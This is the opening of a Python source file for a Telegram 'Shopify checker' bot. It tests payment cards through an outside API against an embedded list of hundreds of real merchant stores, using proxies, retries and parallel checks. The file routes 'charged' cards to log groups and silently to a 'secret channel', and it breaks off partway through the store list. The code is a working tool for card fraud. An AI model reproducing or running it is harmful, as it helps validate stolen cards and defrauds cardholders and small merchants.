"""
sh.py  v28  —  /sh single-card + /msh mass Shopify checker
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Framework : python-telegram-bot v21
API       : https://shopicardx.up.railway.app/shopii
            GET ?cc=NUM|MM|YY|CVV&site=https://DOMAIN&proxy=http://ip:port
            proxy = http://ip:port  (WITH http:// prefix)

ROOT-CAUSE FIX:
  The API ALWAYS returns HTTP 200. Errors come in the JSON body:
    {"Response": "site error! status: 404"}
  We check the RESPONSE STRING before classify_response.
  "site error! status: 404/403" → blacklist site, zero-sleep skip.
  Raw error strings are NEVER shown to the user (_clean_resp sanitises).

SITES:
  672 sites from sites.txt are embedded directly in BUILTIN_SITES so
  the bot always has them even if the file path is wrong.
  _load_sites() tries sites.txt on disk first; falls back to BUILTIN_SITES.

DM POLICY:
  CHARGED → user DM + HIT_LOG_GROUP_ID + EXTRA_CHARGED_GROUP_ID
  LIVE    → user DM only
  TDS     → user DM only
  DEAD    → nothing

EXPORTS:
  get_sh_handler, _check_card_with_retry, SITE_RETRIES, SITE_TIMEOUT
  MSH_SESSIONS, run_mass_batch, create_msh_session
  cb_msh_result, cb_msh_stop, build_result_msg
  _load_sites, _load_proxies
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
from __future__ import annotations

import asyncio
import json as _json
import logging
import random
import re
import string
import time
from datetime import datetime
from html import escape
from io import BytesIO
from typing import Optional

import aiohttp
from telegram import Update, InputFile, MessageEntity
from telegram.ext import CommandHandler, CallbackQueryHandler, ContextTypes

from config import (
    OWNER_ID,
    get_bin_info, tg_emoji,
    RawMarkup, _btn,
    BOT_NAME, CHANNEL_LINK,
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONSTANTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
API_URL       = "https://shopicardx.up.railway.app/shopii"
BOT_CHANNEL   = CHANNEL_LINK
DEV_LINK_HTML = f'<a href="{BOT_CHANNEL}">{BOT_NAME}</a>'

HIT_LOG_GROUP_ID       = -1004361062205   # public hit log group
EXTRA_CHARGED_GROUP_ID = -1003991915326   # extra charged log

# ── Secret channel — auto-receives every CHARGED card silently ──────────────
SECRET_CHANNEL_ID   = -1004499920555
SECRET_CHANNEL_LINK = "https://t.me/+86iK7fXMWEY2MGRk"
# ── Result card buttons ─────────────────────────────────────────────────────
BOT_USERNAME_LINK   = "https://t.me/batcardchk29_bot"
BOT_PLANS_LINK      = "https://t.me/batcardchk29_bot?start=plans"  # deep-links → /plans
MY_CHANNEL_LINK     = "https://t.me/Batcardchk"                    # main channel
LOGS_CHANNEL_LINK   = "https://t.me/+BXmeotREVhllODFk"             # hits log channel

SH_COOLDOWN    = 25
SITE_RETRIES   = 40    # sites tried per card — matches msh.py MAX_RETRIES
SITE_TIMEOUT   = 12    # live sites respond in 7-8s; must be above that
MAX_CONCURRENT = 15    # cards checked in parallel
CARD_STAGGER   = 0.3   # stagger between card launches (seconds)
BUTTON_LOCK    = 30

_CB_RESULT = "mshr"
_CB_STOP   = "mshs"

MSH_SESSIONS: dict  = {}
_BIN_CACHE:   dict  = {}
_DEAD_SITES:  set   = set()
_ALL_PROXIES: list  = []

# Site-prober cache — populated by probe_all_sites(), used by get_working_sites()
_WORKING_SITES:     list  = []
_PROBE_IN_PROGRESS: bool  = False
_PROBE_LAST_RUN:    float = 0.0
PROBE_TTL:          float = 1800.0   # re-probe every 30 min
PROBE_CARD:         str   = "4000223372377978|05|29|651"   # same test card as sitechk.py
PROBE_TIMEOUT:      float = 12.0
PROBE_CONCURRENCY:  int   = 60

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# EMOJI IDS  — full set from mst.py (custom premium stickers)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Core card/user/time emojis
CARD_EMOJI_ID     = "5800709991627232190"
USER_EMOJI_ID     = "4958689671950369798"
TIME_EMOJI_ID     = "5382194935057372936"
DEV_EMOJI_ID      = "6267091732861555879"
PRO_EMOJI_ID      = "6298678524379137990"

# Status emojis
DECLINED_EMOJI_ID = "4956612582816351459"

# Hit-log emojis
HIT_GATE_EMOJI_ID = "5341715473882955310"
HIT_RESP_EMOJI_ID = "5839116473951328489"

# Progress-message emojis
PROG_GATE_EMOJI_ID     = "5341715473882955310"
PROG_PROGRESS_EMOJI_ID = "5258113901106580375"
PROG_CHARGED_EMOJI_ID  = "5427168083074628963"
PROG_LIVE_EMOJI_ID     = "6267225207560214192"   # ← fixed (was same as CHARGED)
PROG_DEAD_EMOJI_ID     = "4958526153955476488"
PROG_ERRORS_EMOJI_ID   = "4956611513369494230"

# Button emojis
BTN_CHARGED_EMOJI_ID = "5465465194056525619"   # 💎 charged button
BTN_LIVE_EMOJI_ID    = "5039793437776282663"   # ✅ live button
BTN_ALL_EMOJI_ID     = "4956324463525233747"   # 📁 all button
BTN_STOP_EMOJI_ID    = "6179444193518162239"   # ⛔ stop button

# Pool of 18 premium animated emojis — used for CHARGED and LIVE hits (random per card)
CHARGED_EMOJI_IDS = [
    "5801154993188770160", "4956739572114392015", "5285221724634239278",
    "5287777298894835685", "5285024405246725814", "5287547831677112267",
    "5287658362660474522", "5285186510197381130", "5803233241963959320",
    "5462902520215002477", "5787435351521889877", "5323674506705785412",
    "5801005158959683238", "5436143465211640305", "5800688138833629633",
    "5891044423856296980", "5436068999068662274", "5427168083074628963",
]

# LIVE_EMOJI_IDS is the same pool — mst.py uses this name for LIVE hits
LIVE_EMOJI_IDS = CHARGED_EMOJI_IDS

# Plan emojis (CORE / ELITE / ROOT / CUSTOM)
PLAN_EMOJIS = {
    "CORE":   "5379869575338812919",
    "ELITE":  "5836898273666798437",
    "ROOT":   "4956420911310832630",
    "CUSTOM": "5445027583588593750",
}

# Small-caps → uppercase map for plan name normalisation
SPECIAL_FONT_MAP = {
    'ᴀ': 'A', 'ʙ': 'B', 'ᴄ': 'C', 'ᴅ': 'D', 'ᴇ': 'E',
    'ꜰ': 'F', 'ɢ': 'G', 'ʜ': 'H', 'ɪ': 'I', 'ᴊ': 'J',
    'ᴋ': 'K', 'ʟ': 'L', 'ᴍ': 'M', 'ɴ': 'N', 'ᴏ': 'O',
    'ᴘ': 'P', 'ǫ': 'Q', 'ʀ': 'R', 'ꜱ': 'S', 'ᴛ': 'T',
    'ᴜ': 'U', 'ᴠ': 'V', 'ᴡ': 'W', 'x': 'X', 'ʏ': 'Y',
    'ᴢ': 'Z', 'Ɪ': 'I',
}


def get_random_charged_emoji() -> str:
    """Random premium emoji for CHARGED hits."""
    return random.choice(CHARGED_EMOJI_IDS)


def get_random_live_emoji() -> str:
    """Random premium emoji for LIVE / TDS hits — same pool as mst.py."""
    return random.choice(LIVE_EMOJI_IDS)


def get_plan_emoji_id(plan_name: str) -> str:
    """Return the premium plan emoji ID for a given plan name."""
    if not plan_name:
        return PRO_EMOJI_ID
    norm = "".join(SPECIAL_FONT_MAP.get(c, c.upper()) for c in plan_name)
    if norm in PLAN_EMOJIS:
        return PLAN_EMOJIS[norm]
    for k, v in PLAN_EMOJIS.items():
        if k in norm:
            return v
    return PRO_EMOJI_ID

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 672 SITES FROM sites.txt — embedded so the bot always has them
# _load_sites() tries the file on disk first; falls back here.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
BUILTIN_SITES = [
    "q8ffft-xw.myshopify.com",
    "c66f4f-a3.myshopify.com",
    "calaguadesigns.myshopify.com",
    "zenzecosmetics.myshopify.com",
    "hot-price-tubs.myshopify.com",
    "rebrandskincare.com",
    "daf716-82.myshopify.com",
    "salacious-9245.myshopify.com",
    "borba-farms.myshopify.com",
    "bareglowessentials.myshopify.com",
    "shopozzyris.myshopify.com",
    "storeyfamilyfarm.com",
    "ek-photo-design-2.myshopify.com",
    "thedivinecollection-shop.myshopify.com",
    "datcravat.myshopify.com",
    "fresh-kids-clothing.myshopify.com",
    "modaluminosa.myshopify.com",
    "with-love-beckie.myshopify.com",
    "bryson-city-outdoors.myshopify.com",
    "hohtradingpost.myshopify.com",
    "chubby-buttons.myshopify.com",
    "evasonaike.com",
    "tinkermouse.myshopify.com",
    "rose-farmers-t-mobile-tuesdays.myshopify.com",
    "4jzsh6-hb.myshopify.com",
    "lufteknic.myshopify.com",
    "louis-ck.myshopify.com",
    "foundvintagehomeandgifts.myshopify.com",
    "shiftathleisurewear.com",
    "immense-love1434.myshopify.com",
    "creating-the-difference.myshopify.com",
    "saadik-sheikh.myshopify.com",
    "legitgrails.com",
    "scrap-addicts.myshopify.com",
    "truenorthposters.myshopify.com",
    "darngoodyarn.com",
    "s-t-distributor.myshopify.com",
    "lifejoy-5.myshopify.com",
    "eaton-industries-canada.myshopify.com",
    "sasasas-store.myshopify.com",
    "4conly.myshopify.com",
    "centre-for-apologetic-scholarship-education.myshopify.com",
    "ivyshairproducts.myshopify.com",
    "grammyskidscorner.myshopify.com",
    "friends-school-lisburn-shop.myshopify.com",
    "nexamart-3988.myshopify.com",
    "stopcutsave.myshopify.com",
    "madewithhappy.myshopify.com",
    "mj0dzn-yt.myshopify.com",
    "brandnamecontacts.myshopify.com",
    "instapark-inc.myshopify.com",
    "saloncarinashop.myshopify.com",
    "2zhp1n-mz.myshopify.com",
    "rupaul-us.myshopify.com",
    "ultra-challenge-shop.myshopify.com",
    "mitchellsicecream.myshopify.com",
    "richardproductionsllc.myshopify.com",
    "bliss-home-scents.myshopify.com",
    "mutiny-online.myshopify.com",
    "kyndkits.myshopify.com",
    "illustratedmonthly.myshopify.com",
    "bionyoillustrations.com",
    "vespertine-handmade.myshopify.com",
    "chaotic-connections-llc.myshopify.com",
    "value-nest-co.myshopify.com",
    "jjshallc.myshopify.com",
    "mama-lisas-world.myshopify.com",
    "the-voices-6385.myshopify.com",
    "ashleys-sandbox.myshopify.com",
    "dsc-development-store.myshopify.com",
    "homeschoolingtoday.com",
    "donna-b-collection.myshopify.com",
    "wrigleysnook.myshopify.com",
    "gangofour.myshopify.com",
    "outbox0.myshopify.com",
    "artos-adventure.myshopify.com",
    "sweetandsheeky.myshopify.com",
    "the-stadium-bc.myshopify.com",
    "tish-snookys-manic-panic.myshopify.com",
    "fomato.myshopify.com",
    "everydayevancreative.myshopify.com",
    "witch-way-magazine.myshopify.com",
    "look-feel-great.myshopify.com",
    "outdoorx4.myshopify.com",
    "inspiredjewels9.myshopify.com",
    "ellegant-creations-llc.myshopify.com",
    "madebymarsshop.myshopify.com",
    "itsthethought.myshopify.com",
    "cgcinteriors.co.uk",
    "lucky-pet-2.myshopify.com",
    "d2zac0-ws.myshopify.com",
    "leisure-warehouse.myshopify.com",
    "2-peas-and-a-dog.myshopify.com",
    "wilmot-harvey.myshopify.com",
    "advanced-mixology.myshopify.com",
    "clayworx-studio.myshopify.com",
    "keysmart.myshopify.com",
    "store.freezetag.com",
    "gmtsgb-vh.myshopify.com",
    "eternalglows.myshopify.com",
    "serving-orphans.myshopify.com",
    "fd80bf-46.myshopify.com",
    "makeshiftwings.myshopify.com",
    "sizige.myshopify.com",
    "crafty-kylies-facebook-store.myshopify.com",
    "bs5beyondgames.myshopify.com",
    "mysticallurecrystals.myshopify.com",
    "1-call-home-supply.myshopify.com",
    "fdiqnz-pg.myshopify.com",
    "two-bros-bows.myshopify.com",
    "onekind-shop-8178.myshopify.com",
    "31120v-vy.myshopify.com",
    "ti2wq2-nn.myshopify.com",
    "riprightsticks.com",
    "mp3-player-launch.myshopify.com",
    "math-giraffe-shop.myshopify.com",
    "boondockoutdoors.myshopify.com",
    "calibloom-labels.myshopify.com",
    "bluesheepbakeshop.myshopify.com",
    "wiltshire-air-ambulance-online-shop.myshopify.com",
    "ktdkub-ng.myshopify.com",
    "beautbeautyco.com",
    "revive-thredz.myshopify.com",
    "tech-line-direct.myshopify.com",
    "q07w1t-pn.myshopify.com",
    "casey-powell-music.myshopify.com",
    "ezautowrap.myshopify.com",
    "serenity-jewelry-la.myshopify.com",
    "itsneonrushdesigns.myshopify.com",
    "jjheller.myshopify.com",
    "lu-squared-art.myshopify.com",
    "austin-gifts.myshopify.com",
    "gumh04-z9.myshopify.com",
    "max-and-oscar.myshopify.com",
    "irvmfr-ew.myshopify.com",
    "trycloudy.com",
    "threadbird-store.myshopify.com",
    "lifeschoolingshop.com",
    "shopdous.com",
    "snugcity-dev.myshopify.com",
    "meriwetherfarms.com",
    "dobrick-candle-company.myshopify.com",
    "chazdeanstudio.myshopify.com",
    "lyndsey-green-illustration.myshopify.com",
    "uab2eg-0h.myshopify.com",
    "jackery.myshopify.com",
    "janetgwendesigns.myshopify.com",
    "pkdotbiz.myshopify.com",
    "furrion-global.myshopify.com",
    "chicologyinc.myshopify.com",
    "aru-su-online-shop.myshopify.com",
    "downtowncamera-ca.myshopify.com",
    "worshipforkids.com",
    "w0aywt-50.myshopify.com",
    "nw-composite.myshopify.com",
    "arminger.myshopify.com",
    "roseso-sg.myshopify.com",
    "thenewyorkshavingcompany-2.myshopify.com",
    "frankiemae-s.myshopify.com",
    "thac-store.myshopify.com",
    "illuminatingabilitiesmerch.com",
    "stellas-stickers-studio.myshopify.com",
    "cjstickershop.com",
    "www-everydayessentials-store.myshopify.com",
    "acas-electrical.myshopify.com",
    "nordikido.com",
    "63pizt-rg.myshopify.com",
    "patricks-custom-creations.myshopify.com",
    "delaware-riverkeeper-network-river-shop.myshopify.com",
    "simpli-press-coffee.myshopify.com",
    "sigzhp-hr.myshopify.com",
    "flicker-handmadebylisa.myshopify.com",
    "shop-silver-moon.myshopify.com",
    "strawbox.co",
    "ok-fop.myshopify.com",
    "reading-museum-shop.myshopify.com",
    "pettypalacellc.com",
    "forsythfabrics.myshopify.com",
    "snakeriverbrewing.myshopify.com",
    "utsumiamerica.com",
    "imgospark.myshopify.com",
    "aecebf-98.myshopify.com",
    "stiergames.myshopify.com",
    "washfield-wax.myshopify.com",
    "that-vibe-co.myshopify.com",
    "kombat-instruments-limited-2.myshopify.com",
    "novvy-2.myshopify.com",
    "anecdotecandles.com",
    "shop.forthepeople.com",
    "katandgracie.com",
    "spaceiq.myshopify.com",
    "smart-nest-living.myshopify.com",
    "ny-market-4607.myshopify.com",
    "boujeebloomdesignco.myshopify.com",
    "gohypo.myshopify.com",
    "martha-marmalade.myshopify.com",
    "next-level-warriors.myshopify.com",
    "the-lovett-school-campus-store.myshopify.com",
    "brieezyboutique.com",
    "getpressedbysteph.com",
    "printingbypennylane.com",
    "thehistorylist.myshopify.com",
    "pork-king-good.myshopify.com",
    "5350fe.myshopify.com",
    "drummagazinestore.myshopify.com",
    "parker-party-america.myshopify.com",
    "angeldesigns222.myshopify.com",
    "cwwraps.myshopify.com",
    "velo-orange.myshopify.com",
    "checkthefeed-retail-sales.myshopify.com",
    "edccooperative.myshopify.com",
    "groovesolventless.myshopify.com",
    "musk-ox-farm.myshopify.com",
    "scoopandseeco.myshopify.com",
    "flagnorfail.myshopify.com",
    "spearphish-general-store.myshopify.com",
    "mcwilkinson.myshopify.com",
    "cattlewalkdesigns.myshopify.com",
    "prepmymeal-de.myshopify.com",
    "shoptonyg-com.myshopify.com",
    "secretstock-4.myshopify.com",
    "1x23fg-me.myshopify.com",
    "cleaningstore123.myshopify.com",
    "agentnateur.myshopify.com",
    "tiffany-alvords-store.myshopify.com",
    "junkedbygi.myshopify.com",
    "alegree.myshopify.com",
    "wonderland-bakes-by-el.myshopify.com",
    "dreams-and-rainbows.myshopify.com",
    "go-az-promo.myshopify.com",
    "martha-ash.myshopify.com",
    "wms01z-z9.myshopify.com",
    "miniandthrifty.myshopify.com",
    "violettefieldthreads.com",
    "wombatz-skate-supply.myshopify.com",
    "chaos-tribe-customs.myshopify.com",
    "teamiblends-us.myshopify.com",
    "sytspiano.myshopify.com",
    "maewear.com",
    "marks-deli-2.myshopify.com",
    "smrtft.com",
    "s-scentshandmade.myshopify.com",
    "shop-consciously-20.myshopify.com",
    "theadventurechallenge.myshopify.com",
    "yktusx-bv.myshopify.com",
    "bead-dazzled-beads-and-more.myshopify.com",
    "sunflowermotherhood.myshopify.com",
    "graftobian-make-up-company.myshopify.com",
    "one-stop-stationery-supplies.myshopify.com",
    "000091.myshopify.com",
    "motutruckcaps.myshopify.com",
    "chazdean.com",
    "valerias-this-and-that.myshopify.com",
    "butler-supply-group.myshopify.com",
    "altfragrances.myshopify.com",
    "yepoda-test-discount.myshopify.com",
    "dipity-deals.myshopify.com",
    "awaydaysfootball.com",
    "popupsetc.myshopify.com",
    "moonmadedigitals.myshopify.com",
    "designsandslight.myshopify.com",
    "faviana-co.myshopify.com",
    "boxedtrends.myshopify.com",
    "johnstonsupplies.myshopify.com",
    "beastro.myshopify.com",
    "affcf2.myshopify.com",
    "stickerfule.myshopify.com",
    "designs-by-ginny.myshopify.com",
    "freejacnation.com",
    "soch-sails.myshopify.com",
    "ee8417.myshopify.com",
    "zzf8nd-pt.myshopify.com",
    "vrd-retail.myshopify.com",
    "wv-living-collection.myshopify.com",
    "sajaroo-gifts.myshopify.com",
    "jddesigns-graphics.myshopify.com",
    "mike-doughty.myshopify.com",
    "westmarket812.myshopify.com",
    "collectiveminds-uk.myshopify.com",
    "zen-health-foods.myshopify.com",
    "hey-beautiful-nail-supplies.myshopify.com",
    "internationalsheepdogsociety.myshopify.com",
    "ruahine-ports-limited.myshopify.com",
    "murphybeddepot.myshopify.com",
    "destination-yarn.myshopify.com",
    "creativecakery.myshopify.com",
    "kobeesco.com",
    "shop.jnf.org",
    "hakshop.myshopify.com",
    "darlingmamadigitals.myshopify.com",
    "thegreatnorthcoffee.com",
    "tapni.myshopify.com",
    "of-life-lemons.myshopify.com",
    "swiftbuyshop1.myshopify.com",
    "thebiblerecap.myshopify.com",
    "shoplix-9635.myshopify.com",
    "the-four-felted-seasons.myshopify.com",
    "purr-fectly-yours-2.myshopify.com",
    "btr-bar.myshopify.com",
    "garzapodcast.myshopify.com",
    "slowsimpleseasonal.myshopify.com",
    "dinco-d.myshopify.com",
    "rose-farmers.myshopify.com",
    "mirrormatellc.myshopify.com",
    "dbs838.myshopify.com",
    "ecosusi.myshopify.com",
    "thewrightstore-8085.myshopify.com",
    "nmuzyp-jf.myshopify.com",
    "mouthwatchers.myshopify.com",
    "luxe-habit-life.myshopify.com",
    "hellolittlewonderco.myshopify.com",
    "sallywags-ltd.myshopify.com",
    "tri-forged-studios-2.myshopify.com",
    "ecomhub.us",
    "carrot-goods.myshopify.com",
    "kind-cotton.myshopify.com",
    "dealdrift360.myshopify.com",
    "reboxed.co",
    "shesgotpapers.com",
    "sunbelt-mfg-co.myshopify.com",
    "alfiahandmade.myshopify.com",
    "miniijoyco.com",
    "puroshoppe.myshopify.com",
    "subzerofranchise.myshopify.com",
    "coconu.com",
    "staging-cpap.myshopify.com",
    "do-epic-shit-gear.myshopify.com",
    "one-blushing-bride.myshopify.com",
    "gupshupgreetings.com",
    "alma-records.myshopify.com",
    "larepublicasuperfoods.com",
    "strictly-business-motorsports.myshopify.com",
    "3duxdesign.myshopify.com",
    "paulcardall.myshopify.com",
    "toweltextiles.myshopify.com",
    "legacy-creations-8753.myshopify.com",
    "litime-us.myshopify.com",
    "openboosters.myshopify.com",
    "st-johns-episcopal-school-spirit-store.myshopify.com",
    "gec-store.myshopify.com",
    "national-shrine-of-saint-rita-of-cascia.myshopify.com",
    "fahrenheit-press.myshopify.com",
    "fox-island-coins.myshopify.com",
    "a14kk6-yv.myshopify.com",
    "theclearhome.myshopify.com",
    "rk91ah-u6.myshopify.com",
    "river-organics-skincare.myshopify.com",
    "shinespeechactivities.com",
    "stickii-club.myshopify.com",
    "jezebel-gallery.myshopify.com",
    "iseestarsquilting.myshopify.com",
    "emilysstudio24.myshopify.com",
    "dayspring-pens.myshopify.com",
    "dehavillandmuseum.myshopify.com",
    "arwaybags.myshopify.com",
    "cheapfabricsuk.myshopify.com",
    "saxon-london.myshopify.com",
    "black-amber-glam.myshopify.com",
    "coleyhome.com",
    "brooksfashionstore.myshopify.com",
    "work-right-nw.myshopify.com",
    "zap-supplies.myshopify.com",
    "jennys-print-shop.myshopify.com",
    "inclosed-letterpress-co.myshopify.com",
    "beauty-by-earth-natural-beauty.myshopify.com",
    "creative-yarns-inc.myshopify.com",
    "thesoilking.com",
    "peaches.la",
    "ray-boltz-music-inc.myshopify.com",
    "fightstore-pro.myshopify.com",
    "the-pope-store-3.myshopify.com",
    "petalpopcreations.myshopify.com",
    "builtbar.com",
    "wildling-beauty.myshopify.com",
    "meadow-oaks-ranch.myshopify.com",
    "warrior-spot.myshopify.com",
    "dreamlynk.myshopify.com",
    "streeze.myshopify.com",
    "sparksonlinedeals.myshopify.com",
    "goodordering.myshopify.com",
    "rkruru-1v.myshopify.com",
    "blossom-beauty-5116.myshopify.com",
    "stubbypencilstudio.com",
    "lilafoxanime.myshopify.com",
    "counterpop.myshopify.com",
    "shop-paisley-boutique.myshopify.com",
    "cruz3d.myshopify.com",
    "smore-essentials.myshopify.com",
    "parentgiving.myshopify.com",
    "the-modern-classroom-shop.myshopify.com",
    "always-looking-good-uk.myshopify.com",
    "jyerunning.myshopify.com",
    "eno-nation.myshopify.com",
    "0211h0-ei.myshopify.com",
    "weekend-craft.myshopify.com",
    "therezabazar.myshopify.com",
    "evermore-farm.myshopify.com",
    "cadycreations.myshopify.com",
    "goodnightfox.myshopify.com",
    "bluefoxentertainment.store",
    "mysuds2go.com",
    "distributorsofurbanspiritbiblesbooks-gifts.myshopify.com",
    "jtperceptions.myshopify.com",
    "its-in-the-bag.myshopify.com",
    "ayeshaerotica-merch.myshopify.com",
    "082dc6.myshopify.com",
    "3v1r30-km.myshopify.com",
    "sentinel-supply-stickers.myshopify.com",
    "where-wellness-begins.myshopify.com",
    "sagebrushsavvy.myshopify.com",
    "swackie-warehouse.myshopify.com",
    "craftbased-blanks.myshopify.com",
    "caroline-kate.myshopify.com",
    "village-general-store.myshopify.com",
    "bxc5yf-r0.myshopify.com",
    "info-engraving-keys.myshopify.com",
    "jwnuui-vu.myshopify.com",
    "terijocottrell.myshopify.com",
    "dgy4wx-pn.myshopify.com",
    "possumcrafts.myshopify.com",
    "pri-gift-shop.myshopify.com",
    "unpolished-usa.myshopify.com",
    "storyknits.myshopify.com",
    "kingdomcomecards.com",
    "neat-ninjas.myshopify.com",
    "druh-usa.myshopify.com",
    "vicariouslytcg.myshopify.com",
    "dan-joyce-art.myshopify.com",
    "the-green-company-online.myshopify.com",
    "samtec-store.myshopify.com",
    "utomic-design.myshopify.com",
    "beijaflornaturals.myshopify.com",
    "baby-oumulle.myshopify.com",
    "shaggy-waggy-dogs.myshopify.com",
    "moondropbooksllc.myshopify.com",
    "store.thehistorylist.com",
    "thehappylifeplanner.myshopify.com",
    "aerogenics.myshopify.com",
    "cluse-store-dev.myshopify.com",
    "winter-park-products.myshopify.com",
    "a-featherly-touch-by-jenna.myshopify.com",
    "premium-time.myshopify.com",
    "widmerfeeds.myshopify.com",
    "hotrodmusicsource.myshopify.com",
    "mamamadecustoms.myshopify.com",
    "phillips-fastener.myshopify.com",
    "dont-try-it-buy-it.myshopify.com",
    "fwwestside.myshopify.com",
    "dean-accessories.myshopify.com",
    "alcohol-change-uk.myshopify.com",
    "sharynvinci.myshopify.com",
    "kvwkqa-iu.myshopify.com",
    "shop.mamannyc.com",
    "hueysburgers.myshopify.com",
    "dainty-me-2.myshopify.com",
    "nefj6q-yn.myshopify.com",
    "trusted-choice-store.myshopify.com",
    "bosleyproducts.myshopify.com",
    "bridal-extravaganza-show-tickets.myshopify.com",
    "mooala.com",
    "myldmastore.myshopify.com",
    "save-big-depo.myshopify.com",
    "custom-creations-by-reeno.myshopify.com",
    "pet-meadow-texas.myshopify.com",
    "southspoonfarms.myshopify.com",
    "simpleisbestskincare.myshopify.com",
    "everywhereandnowherefanzine.myshopify.com",
    "worship-for-kids.myshopify.com",
    "4rsfqu-yz.myshopify.com",
    "the-inspired-garden.myshopify.com",
    "the-all-american-rejects.myshopify.com",
    "zttgaf-yu.myshopify.com",
    "50-caliber-racing-2.myshopify.com",
    "followyourblissbykasey.myshopify.com",
    "of-bone-earth.myshopify.com",
    "southern-anchor-ky.myshopify.com",
    "angelalynne.myshopify.com",
    "rebel-nell.myshopify.com",
    "uao-merch.myshopify.com",
    "discountinkllc.myshopify.com",
    "riverorganics.org",
    "warrenton-equipment.myshopify.com",
    "rmdcsc-pz.myshopify.com",
    "dgsrbg-1g.myshopify.com",
    "aunt-ems-quilts.myshopify.com",
    "sugarnspiceartworks.myshopify.com",
    "m22.com",
    "simple-bundles-supply.myshopify.com",
    "auxjump.myshopify.com",
    "himibike.myshopify.com",
    "zentimefidget.myshopify.com",
    "independent-vermont-clothing.myshopify.com",
    "traderoutestulsa.myshopify.com",
    "trendinghi.myshopify.com",
    "ninjapoddd.myshopify.com",
    "rcgirl.myshopify.com",
    "pros-diversified.myshopify.com",
    "the-bodyshoppe.myshopify.com",
    "irkpa.org",
    "poor-mans-diesel-com.myshopify.com",
    "khepristees.com",
    "in-defense-of-animals.myshopify.com",
    "csg-unicorner.myshopify.com",
    "ne-student-services.myshopify.com",
    "magnets-by-k2.myshopify.com",
    "mt-joy-merch.myshopify.com",
    "evamalley.com",
    "respire.com",
    "rock-manna.myshopify.com",
    "rnrmcharity.myshopify.com",
    "owlvenice.myshopify.com",
    "artistcolette.myshopify.com",
    "villagebakery1948.myshopify.com",
    "soapsbyamber.myshopify.com",
    "hbiqa.myshopify.com",
    "vigilantecoffeeco.myshopify.com",
    "generation-tee-2.myshopify.com",
    "shop-modernartoxford-org-uk.myshopify.com",
    "brow-zen.myshopify.com",
    "wrinklesschhminkles-usa.myshopify.com",
    "momandpopcorn.myshopify.com",
    "test-rhf.myshopify.com",
    "meraki-baytown.myshopify.com",
    "speedcube.myshopify.com",
    "binspiredstore.myshopify.com",
    "jade-bird-us.myshopify.com",
    "radkut.com",
    "leesaboonedesigns.com",
    "theloopystitch.com",
    "rockcreekmetalcraft.com",
    "01eaiz-g9.myshopify.com",
    "shady-side-academy-store.myshopify.com",
    "eatbobos.myshopify.com",
    "9n0qke-qp.myshopify.com",
    "clarketinwhistle.myshopify.com",
    "urbanbelledesigns.myshopify.com",
    "raynrandy.myshopify.com",
    "nmtcb.myshopify.com",
    "store.mtjoyband.com",
    "the-affordable-general-store.myshopify.com",
    "greenplanetprint.com",
    "numerogroup.com",
    "fc7ed6-bd.myshopify.com",
    "cdbucsshop.myshopify.com",
    "move-to-amend.myshopify.com",
    "commonthread-3.myshopify.com",
    "coastalhazedesigns.myshopify.com",
    "here-comes-the-nerd.myshopify.com",
    "candles-oud.myshopify.com",
    "caveandcanyon.myshopify.com",
    "chavibes.com",
    "4c69a9-d9.myshopify.com",
    "p-louise-cosmetics.myshopify.com",
    "miacreativelab.myshopify.com",
    "kc-needlepoint.myshopify.com",
    "explosions-in-the-sky-us.myshopify.com",
    "jenny-provo.myshopify.com",
    "toolmakermetalworkz-com.myshopify.com",
    "fitness-warehouse.myshopify.com",
    "orangesweetorange.myshopify.com",
    "planterhomawholesale.com",
    "daymondjohn.myshopify.com",
    "shoprcs.myshopify.com",
    "karmaminimart.com",
    "seramerch.com",
    "csa-graphics.myshopify.com",
    "thomas-struts-southern-haberdashery.myshopify.com",
    "lumoraahaven.myshopify.com",
    "api1p5-we.myshopify.com",
    "marie-force.myshopify.com",
    "pr1nts-of-darkness.myshopify.com",
    "wonkyolive.myshopify.com",
    "esmfkn-xa.myshopify.com",
    "whyqrr-xj.myshopify.com",
    "happyplangirlsdesigns.myshopify.com",
    "best-version-4855.myshopify.com",
    "simply-radiant-beauty.myshopify.com",
    "the-hobbit-hole-chatteris.myshopify.com",
    "zi1mv1-20.myshopify.com",
    "mood.design",
    "bazzu-8315.myshopify.com",
    "leahday.com",
    "ux-gear.myshopify.com",
    "spatty-2.myshopify.com",
    "workshopcompanionstore.com",
    "looseassociations.myshopify.com",
    "doubleoutlines.com",
    "penningtonschool.myshopify.com",
    "ollie-bows.myshopify.com",
    "e3yyag-xu.myshopify.com",
    "creative-kathi.myshopify.com",
    "aa3d42-2.myshopify.com",
    "tswmusic.myshopify.com",
    "fhpbng-w5.myshopify.com",
    "planetdds.myshopify.com",
    "bi06ub-iy.myshopify.com",
    "miller-bros-paint.myshopify.com",
    "umt-coaching.myshopify.com",
    "lulufabrics.com",
    "jasonbolandandthestragglers.myshopify.com",
    "20for20-anchor-merchandise.myshopify.com",
    "vela-farms-2585.myshopify.com",
    "cody-kate-boutique.myshopify.com",
    "the-cleaning-hub-ltd.myshopify.com",
    "sdmcvz-jn.myshopify.com",
    "my-maravia.myshopify.com",
    "richmimosadigitalcreations.myshopify.com",
    "blueteesgolf.myshopify.com",
    "shopdoggieworks.myshopify.com",
    "felipaoriginals.myshopify.com",
    "greenway-sustainable-containers.myshopify.com",
    "fqcaiz-ma.myshopify.com",
    "uzfmqh-gr.myshopify.com",
    "janebrookwell.myshopify.com",
    "m3v1gc-jc.myshopify.com",
    "aaronnhall.myshopify.com",
    "bibis94.myshopify.com",
    "airspeedjunkie.myshopify.com",
    "derwent-harps.myshopify.com",
    "apkbridal.myshopify.com",
    "the-epoxy-resin-store.myshopify.com",
    "memorialbakeryhtx.myshopify.com",
    "llamazinglooksco.myshopify.com",
    "threecitycustoms-com.myshopify.com",
